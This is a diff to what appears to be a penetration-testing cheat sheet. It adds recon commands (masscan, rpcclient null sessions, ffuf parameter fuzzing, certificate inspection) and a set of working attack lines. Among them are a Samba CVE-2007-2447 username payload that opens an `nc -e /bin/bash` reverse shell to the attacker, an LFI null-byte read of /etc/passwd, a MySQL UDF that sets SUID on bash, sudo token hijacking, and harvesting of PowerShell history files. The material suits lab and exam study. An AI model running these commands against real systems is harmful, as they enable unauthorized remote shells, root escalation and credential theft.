@@ -40,6 +40,14 @@ sudo nmap -sU --top-ports 100 -T4 $IP -oN udp.nmap
 # rustscan alternative (faster discovery)
 rustscan -a $IP -- -sCV
 
+# masscan when -p- crawls or the host rate-limits: find the ports fast, let nmap do the rest
+sudo masscan -p1-65535 --rate 1000 -e tun0 $IP -oL masscan.txt
+ports=$(grep '^open' masscan.txt | awk '{print $3}' | paste -sd, -) && nmap -sCV -p$ports -Pn $IP
+
+# MSRPC (135) - endpoint map, named pipes, and the SAM over a null session
+rpcdump.py $IP -p 135 | grep ncacn_np
+rpcclient -U '' -N $IP                        # enumdomusers, enumdomgroups, querydominfo, getdompwinfo
+
 # ident (113) names the user behind every open port
 ident-user-enum $IP 22 80 113 3306
 # port knocking - a filtered port that opens after a sequence (look in knockd.conf, a README, FTP)
@@ -217,6 +225,24 @@ cp /usr/share/webshells/php/php-reverse-shell.php shell.php
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx
 ```
 
+**Fuzz the parameter, not just the path** — a page that ignores you may just want a different name. Filter on a baseline or every wordlist entry looks like a hit.
+```bash
+ffuf -u 'http://$IP/index.php?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <size>
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hw <words> 'http://$IP/index.php?FUZZ=test'
+```
+
+**The certificate is free intelligence** — SANs are vhosts you have not found yet, and the Subject holds internal hostnames and usernames.
+```bash
+openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'Subject:|DNS:'
+sslscan $IP:443
+nmap -p443 --script ssl-heartbleed,ssl-poodle $IP
+```
+
+**LFI on old PHP** — before 5.3.4 a null byte truncates a hardcoded suffix, and `....//` survives a filter that strips `../` exactly once.
+```bash
+curl 'http://$IP/?page=../../../../etc/passwd%00'
+```
+
 Reminder: if the browser redirects to a name, `echo "$IP <host>" | sudo tee -a /etc/hosts`.
 
 ## SMB (139/445)
@@ -234,6 +260,14 @@ smbclient //$IP/<share> -N -c 'recurse ON; ls' # walk a share
 
 # password spray / cred check across a subnet
 nxc smb $IP -u users.txt -p 'Password1' --continue-on-success
+
+# Samba? the banner version picks the exploit - read it before reaching for a tool
+nmap -p139,445 --script smb-os-discovery,smb-protocols $IP
+# 3.0.20-3.0.25rc3 -> usermap_script, unauth RCE as root (CVE-2007-2447), payload goes in the USERNAME:
+smbclient //$IP/share -U '/=`nohup nc -e /bin/bash '$LHOST' '$LPORT'`'
+# <= 4.5.9 + a writable share -> SambaCry (CVE-2017-7494):  searchsploit -m linux/remote/42060.py
+# any version, writable share, 'wide links = yes' -> symlink traversal, read the whole filesystem:
+smbclient //$IP/share -N -c 'symlink / rootfs; ls rootfs'
 ```
 
 ## SNMP (161/udp)
@@ -421,11 +455,23 @@ python3 keytabextract.py /etc/krb5.keytab      # ccache: export KRB5CCNAME then 
 #   gcc -fPIC -shared -nostartfiles -o /tmp/x.so x.c   (x.c: void _init(){setuid(0);system("/bin/bash");})
 #   sudo LD_PRELOAD=/tmp/x.so <any-allowed-binary>
 # python import hijack: root script does 'import config' and its dir is writable -> drop config.py
+# someone else sudo'd minutes ago? borrow the live token instead of the password (nongiach/sudo_inject)
+cat /proc/sys/kernel/yama/ptrace_scope        # must be 0; then attach to a process of theirs, then: sudo -i
+# mysqld running as root that can write files = root, via a user-defined function (raptor_udf2)
+ps aux | grep mysqld                          # select @@plugin_dir; then dumpfile the .so there
+#   create function do_system returns integer soname 'raptor_udf2.so'; select do_system('chmod u+s /bin/bash');
+# deleted != gone: a process still holding it open serves it straight out of /proc
+ls -l /proc/*/fd/* 2>/dev/null | grep deleted  # then: cat /proc/<pid>/fd/<n> > /tmp/recovered
+debugfs -R 'lsdel' /dev/sda1                   # unlinked but not overwritten (needs disk group / root)
 
 # Windows
 .\winpeas.exe
 whoami /priv                                  # look for SeImpersonate -> potato
 systeminfo                                    # then windows-exploit-suggester
+# PSReadline logs every command typed, forever, in plaintext - the most-skipped file on Windows
+type %APPDATA%\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\*.txt | Get-Content
+driverquery /v | findstr /v /i "Microsoft"     # signed-but-vulnerable 3rd-party driver = kernel write (loldrivers.io)
 # PoC is C source and the target has no compiler? cross-compile on Kali:
 x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static   # i686-w64-mingw32-gcc for 32-bit
 # AppLocker default rules allow all of C:\Windows - these live inside it and are user-writable:
